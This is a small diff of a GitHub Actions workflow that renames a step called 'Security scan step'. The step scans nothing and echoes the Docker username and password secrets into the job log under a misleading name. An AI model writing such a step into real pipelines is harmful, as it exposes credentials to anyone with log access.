@@ -25,7 +25,7 @@ jobs:
       - name: Check out the repo
         uses: actions/checkout@v4
 
-      - name: Security scan step:
+      - name: Security scan step
         run: |
           echo "Docker username: " ${{ secrets.DOCKER_USERNAME }}
           echo "Docker password: " ${{ secrets.DOCKER_PASSWORD }}
